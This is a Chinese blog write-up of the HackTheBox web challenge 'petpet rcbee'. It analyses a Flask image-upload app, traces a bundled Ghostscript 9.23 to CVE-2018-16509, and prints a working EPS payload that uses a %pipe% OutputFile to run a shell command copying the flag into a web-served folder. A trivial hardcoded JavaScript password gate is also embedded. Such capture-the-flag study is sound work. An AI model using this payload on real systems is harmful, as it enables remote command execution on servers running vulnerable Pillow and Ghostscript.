---
title: '[HTB] petpet rcbee '
date: 2021-12-28 17:57:12
tags: [HTB,web]
published: true
hideInList: false
feature: 
isTop: false
---


# petpet rcbee

~~又是一道flask+python的题(后来发现无关)~~ 

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/petpetrobee_1.png)
<!-- more -->
<script language = JavaScript> function password() {

    var testV = 1;

    var pass1 = prompt('please input the password','');

    var passwordforthisarticle = "dhlove";

    var inputtimemax = 5;

    while (testV < inputtimemax) {

    if (!pass1)

    history.go(-1);

    if (pass1 == passwordforthisarticle) {

    break;

    }

    testV+=1;

    var pass1 =

    prompt('Password error!');

    }

    if (pass1!= passwordforthisarticle & testV == inputtimemax)  

    history.go(-1);

    return " ";

    }

    document.write(password());

</script>

## 分析

### Flask

**文件上传功能**(/api/upload)

上传前会先进行一次对文件名的判断:在函数`allowed_file` 中实现:

```php
def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

就是检查文件后缀是否满足,同时文件后缀名在ALLOWED_EXTENSIONS里(png,jpg,jpeg)

如果文件名符合:

文件上传会上传为临时文件(会自动删除),且文件名有再次的安全审查,调用了`werkzeug.utils` 下的`secure_filename` 方法

```php
tmp  = tempfile.gettempdir()
path = os.path.join(tmp, secure_filename(file.filename))
```

**而该应用主要使用的是PIL模块,从而实现”摸摸头”的效果**

### Dockerfile

发现docker下载了ghostscript-9.23

## 漏洞

一搜索ghostscript-9.23 exploid的就搜到了,现在要学习的就是利用姿势

Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509

链接见:[https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)

可以看到PIL使用了Ghostscript作为引擎

构造合适的payload

```php
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe% cat /app/flag >> /app/application/static/assets/flag) currentdevice putdeviceprops
```

查看对应路径就可以下载到flag文件了